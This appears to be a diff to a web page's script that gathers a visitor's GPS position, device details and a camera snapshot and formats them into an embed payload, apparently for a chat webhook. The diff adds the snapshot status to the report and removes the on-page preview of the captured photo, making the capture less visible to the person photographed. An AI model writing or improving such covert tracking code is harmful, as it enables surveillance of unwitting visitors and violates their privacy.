@@ -66,6 +66,10 @@
 
       const formData = new FormData();
 
+      const snapshotLine = capturedImageData
+        ? "📸 Snapshot received: ✅ [Download Image](attachment://snapshot.png)"
+        : "📸 Snapshot received: ❌ No image available";
+
       const payload = {
         embeds: [{
           title: "📍 GPS & Device Info",
@@ -83,6 +87,7 @@
             `\n**Language:** ${device.language}` +
             `\n**Screen:** ${device.screen}` +
             `\n**Touch Support:** ${device.touchSupport}` +
+            `\n\n${snapshotLine}` +
             `\n\n🕒 ${new Date().toLocaleString()}`
         }]
       };
@@ -142,9 +147,6 @@
               const ctx = canvas.getContext("2d");
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               capturedImageData = canvas.toDataURL("image/png");
-
-              // OPTIONAL: Preview image (you can delete the next line later)
-              document.body.appendChild(canvas);
 
               stream.getTracks().forEach(track => track.stop());
               resolve();
